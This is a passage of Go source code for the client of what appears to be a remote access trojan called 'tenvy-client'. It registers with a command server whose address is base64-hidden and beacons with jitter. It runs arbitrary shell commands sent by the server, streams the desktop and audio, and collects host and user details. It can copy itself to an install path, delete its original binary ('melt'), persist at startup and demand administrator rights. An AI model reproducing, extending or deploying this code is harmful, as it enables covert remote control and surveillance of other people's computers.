package main

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	audioctrl "github.com/rootbay/tenvy-client/internal/modules/control/audio"
	remote "github.com/rootbay/tenvy-client/internal/modules/control/remote"
	notes "github.com/rootbay/tenvy-client/internal/modules/notes"
	systeminfo "github.com/rootbay/tenvy-client/internal/modules/systeminfo"
	"github.com/rootbay/tenvy-client/internal/platform"
	"github.com/rootbay/tenvy-client/internal/protocol"
)

var buildVersion = "dev"

var (
	defaultServerHostEncoded        = ""
	defaultServerPortEncoded        = ""
	defaultInstallPathEncoded       = ""
	defaultEncryptionKeyEncoded     = ""
	defaultMeltAfterRun             = "false"
	defaultStartupOnBoot            = "false"
	defaultMutexKeyEncoded          = ""
	defaultForceAdminRequirement    = "false"
	defaultPollIntervalOverrideMs   = ""
	defaultMaxBackoffOverrideMs     = ""
	defaultShellTimeoutOverrideSecs = ""
)

const (
	statusOnline  = "online"
	statusOffline = "offline"
)

var ErrUnauthorized = protocol.ErrUnauthorized

const (
	maxBufferedResults  = 50
	defaultPollInterval = 5 * time.Second
	defaultBackoff      = 30 * time.Second
	defaultShellTimeout = 30 * time.Second
)

type (
	AgentConfig               = protocol.AgentConfig
	AgentMetrics              = protocol.AgentMetrics
	Command                   = protocol.Command
	CommandResult             = protocol.CommandResult
	AgentMetadata             = protocol.AgentMetadata
	AgentRegistrationRequest  = protocol.AgentRegistrationRequest
	AgentRegistrationResponse = protocol.AgentRegistrationResponse
	AgentSyncRequest          = protocol.AgentSyncRequest
	AgentSyncResponse         = protocol.AgentSyncResponse
	PingCommandPayload        = protocol.PingCommandPayload
	ShellCommandPayload       = protocol.ShellCommandPayload
	OpenURLCommandPayload     = protocol.OpenURLCommandPayload
)

type Agent struct {
	id             string
	key            string
	baseURL        string
	client         *http.Client
	config         AgentConfig
	logger         *log.Logger
	resultMu       sync.Mutex
	pendingResults []CommandResult
	startTime      time.Time
	metadata       AgentMetadata
	sharedSecret   string
	preferences    BuildPreferences
	remoteDesktop  *remote.RemoteDesktopStreamer
	systemInfo     *systeminfo.Collector
	notes          *notes.Manager
	audioBridge    *audioctrl.AudioBridge
}

func (a *Agent) AgentID() string {
	return a.id
}

func (a *Agent) AgentMetadata() protocol.AgentMetadata {
	return a.metadata
}

func (a *Agent) AgentStartTime() time.Time {
	return a.startTime
}

type BuildPreferences struct {
	InstallPath   string
	MeltAfterRun  bool
	StartupOnBoot bool
	MutexKey      string
	ForceAdmin    bool
}

type temporaryError interface {
	error
	Temporary() bool
}

type registrationError struct {
	err       error
	temporary bool
}

func (e *registrationError) Error() string {
	if e == nil || e.err == nil {
		return "registration error"
	}
	return e.err.Error()
}

func (e *registrationError) Unwrap() error {
	if e == nil {
		return nil
	}
	return e.err
}

func (e *registrationError) Temporary() bool {
	if e == nil {
		return false
	}
	return e.temporary
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

func main() {
	logger := log.New(os.Stdout, "[tenvy-client] ", log.LstdFlags|log.Lmsgprefix)

	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer cancel()

	serverURL := strings.TrimRight(getEnv("TENVY_SERVER_URL", defaultServerURL()), "/")
	sharedSecret := fallback(os.Getenv("TENVY_SHARED_SECRET"), decodeBase64(defaultEncryptionKeyEncoded))
	installPathPreference := fallback(os.Getenv("TENVY_INSTALL_PATH"), decodeBase64(defaultInstallPathEncoded))
	preferences := BuildPreferences{
		InstallPath:   installPathPreference,
		MeltAfterRun:  parseBool(defaultMeltAfterRun),
		StartupOnBoot: parseBool(defaultStartupOnBoot),
		MutexKey:      decodeBase64(defaultMutexKeyEncoded),
		ForceAdmin:    parseBool(defaultForceAdminRequirement),
	}

	if err := enforcePrivilegeRequirement(preferences.ForceAdmin); err != nil {
		logger.Fatalf("privilege requirement not satisfied: %v", err)
	}

	mutexGuard, err := acquireInstanceMutex(preferences.MutexKey)
	if err != nil {
		logger.Fatalf("failed to honor mutex preference: %v", err)
	}
	if mutexGuard != nil {
		defer mutexGuard.Release()
		description := "instance mutex guard"
		if name := mutexGuard.Name(); name != "" {
			description = fmt.Sprintf("instance mutex: %s", name)
		}
		if mutexGuard.Recovered() {
			logger.Printf("recovered stale %s", description)
		} else {
			logger.Printf("acquired %s", description)
		}
	}

	metadata := collectMetadata()

	client := &http.Client{Timeout: 60 * time.Second}

	registration, err := registerAgentWithRetry(ctx, logger, client, serverURL, sharedSecret, metadata, 0)
	if err != nil {
		logger.Fatalf("failed to register agent: %v", err)
	}

	agent := &Agent{
		id:             registration.AgentID,
		key:            registration.AgentKey,
		baseURL:        serverURL,
		client:         client,
		config:         registration.Config,
		logger:         logger,
		pendingResults: make([]CommandResult, 0, 8),
		startTime:      time.Now(),
		metadata:       metadata,
		sharedSecret:   sharedSecret,
		preferences:    preferences,
	}

	agent.remoteDesktop = remote.NewRemoteDesktopStreamer(remote.Config{
		AgentID:   agent.id,
		BaseURL:   agent.baseURL,
		AuthKey:   agent.key,
		Client:    agent.client,
		Logger:    agent.logger,
		UserAgent: userAgent(),
	})
	agent.systemInfo = systeminfo.NewCollector(agent, buildVersion)
	agent.audioBridge = audioctrl.NewAudioBridge(audioctrl.Config{
		AgentID:   agent.id,
		BaseURL:   agent.baseURL,
		AuthKey:   agent.key,
		Client:    agent.client,
		Logger:    agent.logger,
		UserAgent: userAgent(),
	})

	if notesPath, err := notes.DefaultPath(); err != nil {
		logger.Printf("notes disabled (path error): %v", err)
	} else {
		sharedMaterial := sharedSecret
		if strings.TrimSpace(sharedMaterial) == "" {
			sharedMaterial = registration.AgentKey + "-shared"
		}
		if notesManager, err := notes.NewManager(notesPath, registration.AgentKey, sharedMaterial); err != nil {
			logger.Printf("notes disabled (init failed): %v", err)
		} else {
			agent.notes = notesManager
		}
	}

	agent.applyPreferences()

	logger.Printf("registered as %s", agent.id)
	agent.processCommands(ctx, registration.Commands)

	go agent.run(ctx)

	<-ctx.Done()
	logger.Println("shutting down")

	shutdownCtx, shutdownCancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer shutdownCancel()
	agent.audioBridge.Shutdown()
	agent.remoteDesktop.Shutdown()
	if err := agent.sync(shutdownCtx, statusOffline); err != nil {
		logger.Printf("failed to send offline heartbeat: %v", err)
	}
}

func (a *Agent) applyPreferences() {
	installPath := strings.TrimSpace(a.preferences.InstallPath)

	if installPath != "" {
		if err := a.ensureInstallation(installPath); err != nil {
			a.logger.Printf("failed to apply installation preference (%s): %v", installPath, err)
		} else {
			a.logger.Printf("persisted agent binary at %s", installPath)
		}
	} else if a.preferences.MeltAfterRun {
		a.logger.Printf("melt preference ignored because no installation path was provided")
	}

	if a.preferences.StartupOnBoot {
		target := installPath
		if target == "" {
			if exe, err := os.Executable(); err == nil {
				target = exe
			}
		}
		if err := configureStartupPreference(target); err != nil {
			a.logger.Printf("startup preference not fully applied: %v", err)
		} else {
			a.logger.Printf("recorded startup preference for %s", target)
		}
	}
}

func (a *Agent) ensureInstallation(target string) error {
	target = strings.TrimSpace(target)
	if target == "" {
		return nil
	}

	executable, err := os.Executable()
	if err != nil {
		return fmt.Errorf("resolve executable: %w", err)
	}

	executable, err = filepath.Abs(executable)
	if err != nil {
		return fmt.Errorf("resolve executable path: %w", err)
	}

	destPath := target
	if strings.HasSuffix(target, string(os.PathSeparator)) {
		if err := os.MkdirAll(target, 0o755); err != nil {
			return fmt.Errorf("create install directory: %w", err)
		}
		destPath = filepath.Join(target, filepath.Base(executable))
	} else {
		info, statErr := os.Stat(target)
		if statErr == nil && info.IsDir() {
			destPath = filepath.Join(target, filepath.Base(executable))
		} else if statErr != nil {
			if !os.IsNotExist(statErr) {
				return fmt.Errorf("inspect install path: %w", statErr)
			}
			parent := filepath.Dir(target)
			if err := os.MkdirAll(parent, 0o755); err != nil {
				return fmt.Errorf("prepare install parent: %w", err)
			}
		}
	}

	destPath, err = filepath.Abs(destPath)
	if err != nil {
		return fmt.Errorf("resolve destination path: %w", err)
	}

	if samePath(executable, destPath) {
		return nil
	}

	if err := copyBinary(executable, destPath); err != nil {
		return fmt.Errorf("copy binary: %w", err)
	}

	if a.preferences.MeltAfterRun {
		a.scheduleMelt(executable)
	}

	return nil
}

func (a *Agent) scheduleMelt(path string) {
	go func() {
		time.Sleep(3 * time.Second)
		if err := os.Remove(path); err != nil && !os.IsNotExist(err) {
			a.logger.Printf("failed to remove staging binary: %v", err)
		}
	}()
}

func (a *Agent) run(ctx context.Context) {
	pollInterval := a.pollInterval()
	backoff := pollInterval

	for {
		select {
		case <-ctx.Done():
			return
		case <-time.After(a.withJitter(pollInterval)):
		}

		if err := a.sync(ctx, statusOnline); err != nil {
			if errors.Is(err, ErrUnauthorized) {
				a.logger.Printf("sync unauthorized: %v", err)
				if err := a.reRegister(ctx); err != nil {
					if ctx.Err() != nil {
						return
					}
					a.logger.Printf("re-registration failed: %v", err)
				} else {
					pollInterval = a.pollInterval()
					backoff = pollInterval
					continue
				}
			} else {
				a.logger.Printf("sync error: %v", err)
			}
			backoff = minDuration(backoff*2, a.maxBackoff())
			select {
			case <-ctx.Done():
				return
			case <-time.After(backoff):
			}
			continue
		}

		pollInterval = a.pollInterval()
		backoff = pollInterval
	}
}

func (a *Agent) sync(ctx context.Context, status string) error {
	results := a.consumeResults()
	payload, err := a.performSync(ctx, status, results)
	if err != nil {
		if len(results) > 0 && !errors.Is(err, ErrUnauthorized) {
			a.enqueueResults(results)
		}
		return err
	}

	a.config = payload.Config
	a.processCommands(ctx, payload.Commands)

	if a.notes != nil {
		if err := a.notes.SyncShared(ctx, a.client, a.baseURL, a.id, a.key, userAgent()); err != nil {
			if errors.Is(err, ErrUnauthorized) {
				return err
			}
			a.logger.Printf("notes sync failed: %v", err)
		}
	}

	return nil
}

func (a *Agent) performSync(ctx context.Context, status string, results []CommandResult) (*AgentSyncResponse, error) {
	reqBody := AgentSyncRequest{
		Status:    status,
		Timestamp: time.Now().UTC().Format(time.RFC3339Nano),
		Metrics:   a.collectMetrics(),
	}
	if len(results) > 0 {
		reqBody.Results = results
	}

	data, err := json.Marshal(reqBody)
	if err != nil {
		return nil, err
	}

	endpoint := fmt.Sprintf("%s/api/agents/%s/sync", a.baseURL, url.PathEscape(a.id))
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint, bytes.NewReader(data))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json")
	req.Header.Set("User-Agent", userAgent())
	if strings.TrimSpace(a.key) != "" {
		req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", a.key))
	}

	resp, err := a.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 1024))
		message := strings.TrimSpace(string(body))
		if resp.StatusCode == http.StatusUnauthorized {
			if message == "" {
				return nil, ErrUnauthorized
			}
			return nil, fmt.Errorf("%w: %s", ErrUnauthorized, message)
		}
		if message == "" {
			message = fmt.Sprintf("status %d", resp.StatusCode)
		}
		return nil, fmt.Errorf("sync failed: %s", message)
	}

	var payload AgentSyncResponse
	if err := json.NewDecoder(resp.Body).Decode(&payload); err != nil {
		return nil, err
	}

	return &payload, nil
}

func (a *Agent) reRegister(ctx context.Context) error {
	if ctx.Err() != nil {
		return ctx.Err()
	}

	metadata := collectMetadata()
	registration, err := registerAgentWithRetry(ctx, a.logger, a.client, a.baseURL, a.sharedSecret, metadata, a.maxBackoff())
	if err != nil {
		return err
	}

	a.metadata = metadata
	a.id = registration.AgentID
	a.key = registration.AgentKey
	a.config = registration.Config
	a.startTime = time.Now()
	a.resultMu.Lock()
	a.pendingResults = a.pendingResults[:0]
	a.resultMu.Unlock()

	a.logger.Printf("re-registered as %s", a.id)
	a.processCommands(ctx, registration.Commands)
	return nil
}

func (a *Agent) processCommands(ctx context.Context, commands []Command) {
	for _, cmd := range commands {
		if ctx.Err() != nil {
			a.enqueueResult(CommandResult{
				CommandID:   cmd.ID,
				Success:     false,
				Error:       "agent shutting down",
				CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
			})
			continue
		}

		a.logger.Printf("executing command %s (%s)", cmd.ID, cmd.Name)
		result := a.executeCommand(ctx, cmd)
		a.enqueueResult(result)
	}
}

func (a *Agent) executeCommand(ctx context.Context, cmd Command) CommandResult {
	switch cmd.Name {
	case "ping":
		return handlePingCommand(cmd)
	case "shell":
		return handleShellCommand(ctx, cmd)
	case "remote-desktop":
		if a.remoteDesktop == nil {
			return CommandResult{
				CommandID:   cmd.ID,
				Success:     false,
				Error:       "remote desktop subsystem not initialized",
				CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
			}
		}
		return a.remoteDesktop.HandleCommand(ctx, cmd)
	case "audio-control":
		if a.audioBridge == nil {
			return CommandResult{
				CommandID:   cmd.ID,
				Success:     false,
				Error:       "audio subsystem not initialized",
				CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
			}
		}
		return a.audioBridge.HandleCommand(ctx, cmd)
	case "system-info":
		if a.systemInfo == nil {
			return CommandResult{
				CommandID:   cmd.ID,
				Success:     false,
				Error:       "system information subsystem not initialized",
				CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
			}
		}
		return a.systemInfo.HandleCommand(ctx, cmd)
	case "open-url":
		return handleOpenURLCommand(cmd)
	default:
		return CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       fmt.Sprintf("unsupported command: %s", cmd.Name),
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		}
	}
}

func handlePingCommand(cmd Command) CommandResult {
	var payload PingCommandPayload
	_ = json.Unmarshal(cmd.Payload, &payload)
	response := "pong"
	if strings.TrimSpace(payload.Message) != "" {
		response = payload.Message
	}
	return CommandResult{
		CommandID:   cmd.ID,
		Success:     true,
		Output:      response,
		CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
	}
}

type shellExecutionOptions struct {
	workingDirectory string
	environment      map[string]string
}

func handleShellCommand(ctx context.Context, cmd Command) CommandResult {
	var payload ShellCommandPayload
	if err := json.Unmarshal(cmd.Payload, &payload); err != nil {
		return CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       fmt.Sprintf("invalid shell payload: %v", err),
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		}
	}

	if strings.TrimSpace(payload.Command) == "" {
		return CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "missing command",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		}
	}

	if payload.Elevated && !platform.CurrentUserIsElevated() {
		return CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "elevated execution requested but agent is not running with sufficient privileges",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		}
	}

	workingDirectory := strings.TrimSpace(payload.WorkingDirectory)
	if workingDirectory != "" {
		if !filepath.IsAbs(workingDirectory) {
			if absPath, err := filepath.Abs(workingDirectory); err == nil {
				workingDirectory = absPath
			}
		}
		info, err := os.Stat(workingDirectory)
		if err != nil {
			return CommandResult{
				CommandID:   cmd.ID,
				Success:     false,
				Error:       fmt.Sprintf("invalid working directory: %v", err),
				CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
			}
		}
		if !info.IsDir() {
			return CommandResult{
				CommandID:   cmd.ID,
				Success:     false,
				Error:       fmt.Sprintf("working directory is not a directory: %s", workingDirectory),
				CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
			}
		}
	}

	timeout := fallbackShellTimeout()
	if payload.TimeoutSeconds > 0 {
		timeout = time.Duration(payload.TimeoutSeconds) * time.Second
	}

	commandCtx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	output, err := runShell(commandCtx, payload.Command, shellExecutionOptions{
		workingDirectory: workingDirectory,
		environment:      payload.Environment,
	})
	result := CommandResult{
		CommandID:   cmd.ID,
		CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
	}

	if err != nil {
		result.Success = false
		result.Error = err.Error()
		result.Output = string(output)
	} else {
		result.Success = true
		result.Output = string(output)
	}
	return result
}

func handleOpenURLCommand(cmd Command) CommandResult {
	var payload OpenURLCommandPayload
	if err := json.Unmarshal(cmd.Payload, &payload); err != nil {
		return CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       fmt.Sprintf("invalid open-url payload: %v", err),
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		}
	}

	trimmed := strings.TrimSpace(payload.URL)
	if trimmed == "" {
		return CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "missing url",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		}
	}

	parsed, err := url.Parse(trimmed)
	if err != nil {
		return CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       fmt.Sprintf("invalid url: %v", err),
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		}
	}

	if !parsed.IsAbs() || parsed.Host == "" {
		return CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "url must be absolute",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		}
	}

	scheme := strings.ToLower(parsed.Scheme)
	if scheme != "http" && scheme != "https" {
		return CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       fmt.Sprintf("unsupported url scheme: %s", parsed.Scheme),
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		}
	}

	normalized := parsed.String()

	if err := openURLInBrowser(normalized); err != nil {
		return CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       fmt.Sprintf("failed to open url: %v", err),
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		}
	}

	return CommandResult{
		CommandID:   cmd.ID,
		Success:     true,
		Output:      fmt.Sprintf("opened %s", normalized),
		CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
	}
}

func openURLInBrowser(target string) error {
	var cmd *exec.Cmd

	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("rundll32", "url.dll,FileProtocolHandler", target)
	case "darwin":
		cmd = exec.Command("open", target)
	default:
		cmd = exec.Command("xdg-open", target)
	}

	if err := cmd.Start(); err != nil {
		return err
	}

	if cmd.Process != nil {
		return cmd.Process.Release()
	}

	return nil
}

func runShell(ctx context.Context, command string, options shellExecutionOptions) ([]byte, error) {
	var execCmd *exec.Cmd
	if runtime.GOOS == "windows" {
		execCmd = exec.CommandContext(ctx, "cmd", "/C", command)
	} else {
		shell := os.Getenv("SHELL")
		if shell == "" {
			shell = "/bin/sh"
		}
		execCmd = exec.CommandContext(ctx, shell, "-c", command)
	}

	if options.workingDirectory != "" {
		execCmd.Dir = options.workingDirectory
	}

	if len(options.environment) > 0 {
		execCmd.Env = mergeEnvironments(os.Environ(), options.environment)
	}

	return execCmd.CombinedOutput()
}

func mergeEnvironments(base []string, overrides map[string]string) []string {
	if len(overrides) == 0 {
		return base
	}

	env := make([]string, 0, len(base)+len(overrides))
	for _, kv := range base {
		key := kv
		if idx := strings.IndexRune(kv, '='); idx >= 0 {
			key = kv[:idx]
		}
		if _, ok := overrides[key]; ok {
			continue
		}
		env = append(env, kv)
	}

	for key, value := range overrides {
		trimmed := strings.TrimSpace(key)
		if trimmed == "" {
			continue
		}
		env = append(env, fmt.Sprintf("%s=%s", trimmed, value))
	}

	return env
}

func (a *Agent) enqueueResult(result CommandResult) {
	a.resultMu.Lock()
	defer a.resultMu.Unlock()
	a.pendingResults = append(a.pendingResults, result)
	if len(a.pendingResults) > maxBufferedResults {
		a.pendingResults = append([]CommandResult(nil), a.pendingResults[len(a.pendingResults)-maxBufferedResults:]...)
	}
}

func (a *Agent) enqueueResults(results []CommandResult) {
	for _, result := range results {
		a.enqueueResult(result)
	}
}

func (a *Agent) consumeResults() []CommandResult {
	a.resultMu.Lock()
	defer a.resultMu.Unlock()
	if len(a.pendingResults) == 0 {
		return nil
	}
	results := make([]CommandResult, len(a.pendingResults))
	copy(results, a.pendingResults)
	a.pendingResults = a.pendingResults[:0]
	return results
}

func (a *Agent) collectMetrics() *AgentMetrics {
	var stats runtime.MemStats
	runtime.ReadMemStats(&stats)
	return &AgentMetrics{
		MemoryBytes:   stats.Alloc,
		Goroutines:    runtime.NumGoroutine(),
		UptimeSeconds: uint64(time.Since(a.startTime).Seconds()),
	}
}

func (a *Agent) pollInterval() time.Duration {
	if a.config.PollIntervalMs <= 0 {
		return fallbackPollInterval()
	}
	return time.Duration(a.config.PollIntervalMs) * time.Millisecond
}

func (a *Agent) maxBackoff() time.Duration {
	if a.config.MaxBackoffMs <= 0 {
		return fallbackMaxBackoff()
	}
	return time.Duration(a.config.MaxBackoffMs) * time.Millisecond
}

func (a *Agent) withJitter(base time.Duration) time.Duration {
	ratio := a.config.JitterRatio
	if ratio <= 0 {
		return base
	}
	jitter := (rand.Float64()*2 - 1) * ratio * float64(base)
	value := time.Duration(float64(base) + jitter)
	if value <= 0 {
		return base
	}
	return value
}

func registerAgentWithRetry(ctx context.Context, logger *log.Logger, client *http.Client, serverURL, token string, metadata AgentMetadata, maxBackoff time.Duration) (*AgentRegistrationResponse, error) {
	if maxBackoff <= 0 {
		maxBackoff = fallbackMaxBackoff()
	}
	if maxBackoff <= 0 {
		maxBackoff = defaultBackoff
	}

	backoff := time.Second
	if backoff <= 0 {
		backoff = time.Second
	}

	attempt := 1
	for {
		registration, err := registerAgent(ctx, client, serverURL, token, metadata)
		if err == nil {
			if attempt > 1 {
				logger.Printf("registration succeeded after %d attempts", attempt)
			}
			return registration, nil
		}

		if ctx.Err() != nil {
			return nil, ctx.Err()
		}

		if errors.Is(err, context.Canceled) || errors.Is(err, context.DeadlineExceeded) {
			return nil, err
		}

		if tempErr, ok := err.(temporaryError); ok && !tempErr.Temporary() {
			logger.Printf("registration aborted after %d attempts: %v", attempt, err)
			return nil, err
		}

		logger.Printf("registration attempt %d failed: %v", attempt, err)

		wait := jitterDuration(backoff)
		if wait > maxBackoff {
			wait = maxBackoff
		}

		logger.Printf("retrying registration in %s", wait)

		select {
		case <-ctx.Done():
			return nil, ctx.Err()
		case <-time.After(wait):
		}

		attempt++
		if backoff < maxBackoff {
			backoff = minDuration(backoff*2, maxBackoff)
		}
	}
}

func registerAgent(ctx context.Context, client *http.Client, serverURL, token string, metadata AgentMetadata) (*AgentRegistrationResponse, error) {
	request := AgentRegistrationRequest{Metadata: metadata}
	if strings.TrimSpace(token) != "" {
		request.Token = token
	}

	data, err := json.Marshal(request)
	if err != nil {
		return nil, err
	}

	endpoint := fmt.Sprintf("%s/api/agents/register", serverURL)
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint, bytes.NewReader(data))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json")
	req.Header.Set("User-Agent", userAgent())

	resp, err := client.Do(req)
	if err != nil {
		if errors.Is(err, context.Canceled) || errors.Is(err, context.DeadlineExceeded) {
			return nil, err
		}

		temporary := false
		var netErr net.Error
		if errors.As(err, &netErr) {
			temporary = netErr.Timeout() || netErr.Temporary()
		}
		if !temporary {
			var opErr *net.OpError
			if errors.As(err, &opErr) {
				temporary = true
			}
		}
		if !temporary {
			var urlErr *url.Error
			if errors.As(err, &urlErr) {
				if urlErr.Timeout() {
					temporary = true
				}
				if !temporary {
					if _, ok := urlErr.Err.(*net.OpError); ok {
						temporary = true
					}
				}
			}
		}

		return nil, &registrationError{err: err, temporary: temporary}
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 1024))
		message := strings.TrimSpace(string(body))
		if message == "" {
			message = fmt.Sprintf("status %d", resp.StatusCode)
		}
		return nil, &registrationError{
			err:       fmt.Errorf("registration failed: %s", message),
			temporary: isTemporaryStatus(resp.StatusCode),
		}
	}

	var payload AgentRegistrationResponse
	if err := json.NewDecoder(resp.Body).Decode(&payload); err != nil {
		return nil, &registrationError{err: err, temporary: true}
	}

	if strings.TrimSpace(payload.AgentID) == "" {
		return nil, &registrationError{err: errors.New("missing agent identifier in response"), temporary: true}
	}
	if strings.TrimSpace(payload.AgentKey) == "" {
		return nil, &registrationError{err: errors.New("missing agent key in response"), temporary: true}
	}

	return &payload, nil
}

func isTemporaryStatus(status int) bool {
	switch {
	case status >= 500:
		return true
	case status == http.StatusTooManyRequests,
		status == http.StatusRequestTimeout,
		status == http.StatusTooEarly:
		return true
	default:
		return false
	}
}

func jitterDuration(base time.Duration) time.Duration {
	if base <= 0 {
		return time.Second
	}

	minFactor := 0.5
	maxFactor := 1.5
	factor := minFactor + rand.Float64()*(maxFactor-minFactor)
	wait := time.Duration(float64(base) * factor)
	if wait <= 0 {
		return base
	}

	return wait
}

func collectMetadata() AgentMetadata {
	hostname, _ := os.Hostname()
	currentUser, err := user.Current()
	username := "unknown"
	if err == nil {
		username = currentUser.Username
	} else if val := os.Getenv("USER"); val != "" {
		username = val
	} else if val := os.Getenv("USERNAME"); val != "" {
		username = val
	}

	tags := parseTags(os.Getenv("TENVY_AGENT_TAGS"))

	return AgentMetadata{
		Hostname:     fallback(hostname, "unknown"),
		Username:     username,
		OS:           runtime.GOOS,
		Architecture: runtime.GOARCH,
		IPAddress:    detectPrimaryIP(),
		Tags:         tags,
		Version:      buildVersion,
	}
}

func defaultServerURL() string {
	host := strings.TrimSpace(fallback(decodeBase64(defaultServerHostEncoded), "localhost"))
	port := strings.TrimSpace(fallback(decodeBase64(defaultServerPortEncoded), "2332"))

	if host == "" {
		host = "localhost"
	}

	if strings.Contains(host, "://") {
		return strings.TrimRight(host, "/")
	}

	if port == "" {
		port = "2332"
	}

	scheme := "http"
	if port == "443" {
		scheme = "https"
	}

	return fmt.Sprintf("%s://%s:%s", scheme, host, port)
}

func decodeBase64(value string) string {
	value = strings.TrimSpace(value)
	if value == "" {
		return ""
	}
	decoded, err := base64.StdEncoding.DecodeString(value)
	if err != nil {
		return ""
	}
	return string(decoded)
}

func parseBool(value string) bool {
	switch strings.ToLower(strings.TrimSpace(value)) {
	case "1", "true", "yes", "on", "enabled":
		return true
	default:
		return false
	}
}

func fallbackPollInterval() time.Duration {
	if duration := parsePositiveDurationMs(defaultPollIntervalOverrideMs); duration > 0 {
		return duration
	}
	return defaultPollInterval
}

func fallbackMaxBackoff() time.Duration {
	if duration := parsePositiveDurationMs(defaultMaxBackoffOverrideMs); duration > 0 {
		return duration
	}
	return defaultBackoff
}

func fallbackShellTimeout() time.Duration {
	if duration := parsePositiveDurationSeconds(defaultShellTimeoutOverrideSecs); duration > 0 {
		return duration
	}
	return defaultShellTimeout
}

func parsePositiveDurationMs(raw string) time.Duration {
	trimmed := strings.TrimSpace(raw)
	if trimmed == "" {
		return 0
	}
	value, err := strconv.Atoi(trimmed)
	if err != nil || value <= 0 {
		return 0
	}
	return time.Duration(value) * time.Millisecond
}

func parsePositiveDurationSeconds(raw string) time.Duration {
	trimmed := strings.TrimSpace(raw)
	if trimmed == "" {
		return 0
	}
	value, err := strconv.Atoi(trimmed)
	if err != nil || value <= 0 {
		return 0
	}
	return time.Duration(value) * time.Second
}

func samePath(a, b string) bool {
	aClean := filepath.Clean(a)
	bClean := filepath.Clean(b)
	if runtime.GOOS == "windows" {
		return strings.EqualFold(aClean, bClean)
	}
	return aClean == bClean
}

func copyBinary(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	tmpPath := dst + ".tmp"
	out, err := os.OpenFile(tmpPath, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0o755)
	if err != nil {
		return err
	}

	if _, err := io.Copy(out, in); err != nil {
		out.Close()
		os.Remove(tmpPath)
		return err
	}

	if err := out.Close(); err != nil {
		os.Remove(tmpPath)
		return err
	}

	if err := os.Rename(tmpPath, dst); err != nil {
		os.Remove(tmpPath)
		return err
	}

	return nil
}

type instanceLock struct {
	file      *os.File
	path      string
	name      string
	recovered bool
}

func (l *instanceLock) Release() {
	if l.file != nil {
		l.file.Close()
	}
	if l.path != "" {
		os.Remove(l.path)
	}
}

func (l *instanceLock) Name() string {
	return l.name
}

func (l *instanceLock) Recovered() bool {
	if l == nil {
		return false
	}
	return l.recovered
}

func acquireInstanceMutex(rawKey string) (*instanceLock, error) {
	key := strings.TrimSpace(rawKey)
	if key == "" {
		return nil, nil
	}

	normalized := strings.ToLower(key)
	hashed := sha256.Sum256([]byte(normalized))
	token := hex.EncodeToString(hashed[:16])
	lockPath := filepath.Join(os.TempDir(), fmt.Sprintf("tenvy-%s.lock", token))

	recovered := false
	for attempt := 0; attempt < 2; attempt++ {
		file, err := os.OpenFile(lockPath, os.O_CREATE|os.O_EXCL|os.O_RDWR, 0o600)
		if err == nil {
			if _, writeErr := file.WriteString(fmt.Sprintf("pid=%d\n", os.Getpid())); writeErr != nil {
				// Best effort; ignore write errors to avoid failing startup.
			}
			return &instanceLock{file: file, path: lockPath, name: key, recovered: recovered}, nil
		}

		if !errors.Is(err, os.ErrExist) {
			return nil, fmt.Errorf("create mutex %s: %w", key, err)
		}

		stale, staleErr := lockFileIsStale(lockPath)
		if staleErr != nil {
			return nil, fmt.Errorf("inspect mutex %s: %w", key, staleErr)
		}
		if !stale {
			return nil, fmt.Errorf("mutex %s is already acquired", key)
		}

		if removeErr := os.Remove(lockPath); removeErr != nil && !os.IsNotExist(removeErr) {
